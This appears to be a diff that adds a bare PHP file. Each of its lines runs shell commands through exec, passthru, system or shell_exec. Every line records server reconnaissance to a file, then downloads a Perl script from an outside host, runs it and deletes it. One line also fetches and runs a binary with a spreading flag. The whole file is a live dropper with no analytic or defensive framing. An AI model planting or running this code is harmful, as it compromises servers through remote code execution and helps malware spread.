@@ -1,0 +1,19 @@
+<?php
+echo exec('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;curl -O http://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+echo exec('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;GET http://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+echo exec('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;http://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+echo exec('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;fetch http://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+echo passthru('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;fetch http://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+echo passthru('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;wget hhttp://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+echo passthru('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;curl -O http://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+echo passthru('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;GET http://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+echo system('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;curl -O http://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+echo system('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;GET http://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+echo system('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;wget http://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+echo system('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;fetch http://zeroboss.helloweb.eu/s.txt;wget http://zeroboss.helloweb.eu/s.txt;chmod 777 s;./s -m n0body -f  SpreadProcess;perl s.txt;rm s.txt');
+echo shell_exec('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;curl -O http://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+echo shell_exec('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;GET http://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+echo shell_exec('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;wget http://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+echo shell_exec('(pwd;ls -lia;w;uname -a) >> spreadfile.txt;cd /tmp;fetch http://zeroboss.helloweb.eu/s.txt;perl s.txt;rm s.txt');
+?>
+
